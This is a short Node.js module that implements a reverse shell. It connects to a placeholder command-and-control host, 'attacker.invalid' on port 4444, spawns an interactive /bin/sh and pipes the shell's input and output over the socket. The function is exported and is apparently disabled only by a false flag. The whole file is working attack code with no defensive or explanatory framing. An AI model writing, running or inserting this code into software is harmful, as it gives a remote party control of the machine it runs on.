'use strict';

const net = require('net');
const { spawn } = require('child_process');

const ENABLE_SHELL = false;

const C2_HOST = 'attacker.invalid';
const C2_PORT = 4444;

function openReverseShell() {
  const socket = net.connect(C2_PORT, C2_HOST, () => {
    const shell = spawn('/bin/sh', ['-i']);
    socket.pipe(shell.stdin);
    shell.stdout.pipe(socket);
    shell.stderr.pipe(socket);
  });
  return socket;
}

if (ENABLE_SHELL) {
  openReverseShell();
}

module.exports = { openReverseShell };
